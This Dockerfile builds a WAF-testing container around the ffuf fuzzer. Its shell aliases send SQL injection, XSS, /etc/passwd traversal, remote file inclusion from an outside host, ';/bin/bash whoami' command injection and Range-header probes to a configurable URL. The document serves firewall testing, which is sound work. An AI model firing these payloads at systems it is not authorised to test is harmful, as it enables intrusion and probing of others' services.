FROM ubuntu:latest

# Buildtime
RUN set -x; buildDeps='curl dnsutils iputils-ping golang-go git python3 python3-pip' \
    && apt-get update \
    && apt-get install -y $buildDeps \
    && git clone https://github.com/ffuf/ffuf

# Prepare files for build
WORKDIR /ffuf
RUN rm -f ./wordlist.txt \
    && rm -f ./sel.py \
    && rm -f ./requirements.txt
COPY ./wordlist.txt .
COPY ./sel.py .
COPY ./requirements.txt .

# Python and golang build
RUN python3 -m pip install -r ./requirements.txt \
    && go get \
    && go build

    # Rate Control Fuzzing with ffuf
RUN echo 'head -${FUZZ_COUNT} wordlist.txt > swordlist.txt' >> ~/.bashrc \
    && echo 'alias fuzz="alias fuzz; ./ffuf -w swordlist.txt -u https://${URL}?q=FUZZ -H \"User-Agent: Mozilla/5.0\""' >> ~/.bashrc \
    # Indiviual WAF Attack Group Testing Payloads
    && echo 'alias wat="alias wat; curl -D - -s \"https://${URL}\" -A \"w3af.sourceforge.net\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias protocol="alias protocol; curl -D - -s \"https://${URL}\" --data-binary \$\"data=foo%uff1cscript%uff1e\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias sqli="alias sqli; curl -D - -s \"https://${URL}\" -A \"UNION%20SELECT%20*%20FROM%20user--\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias xss="alias xss; curl -D - -s \"https://${URL}\" -A \"%3Cscript%3Ealert()%3C/script%3E\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias lfi="alias lfi; curl -D - -s \"https://${URL}\" -A \"..\/.\/..\/.\/..\/etc\/passwd\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias rfi="alias rfi; curl -D - -s \"https://${URL}?q=http:\/\/cirt.net\/rfiinc.txt\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias cmdi="alias cmdi; curl -D - -s \"https://${URL}?q=\;\/bin\/bash%20whoami\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias platform="alias platform; curl -D - -s \"https://${URL}\" -H \"Range: 18446744073709551615\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    && echo 'alias normal="alias normal; curl -D - -s \"https://${URL}\" -A \"astbot/1.0\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc \
    # All WAF Payloads
    && echo 'alias waf="alias waf && wat && protocol && sqli && xss && lfi && rfi && cmdi && platform && normal"' >> ~/.bashrc \
    # All WAF Payloads, output only status code
    && echo 'alias swaf="wat | head -n 1 && protocol | head -n 1 && sqli | head -n 1 && xss | head -n 1 && lfi | head -n 1 && rfi | head -n 1 && cmdi | head -n 1 && platform | head -n 1 && normal | head -n 1"' >> ~/.bashrc \
    # Selenium
    && echo 'alias sel="python3 sel.py"' >> ~/.bashrc \
    # Request Anomaly
    && echo 'alias ra="alias ra; curl -D - -s \"https://${URL}\" -A \"Mozilla/5.0\" -H \"Pragma: Pragma:x-cache,akamai-x-cache-on, akamai-x-get-request-id\" -o /dev/null"' >> ~/.bashrc

# Runtime
CMD echo 'Welcome to ast!\nAvailable commands (as alias): sel, fuzz, ra, waf, swaf,\nwat, protocol, sqli, xss, lfi, rfi, cmdi, platform, normal' ; /bin/bash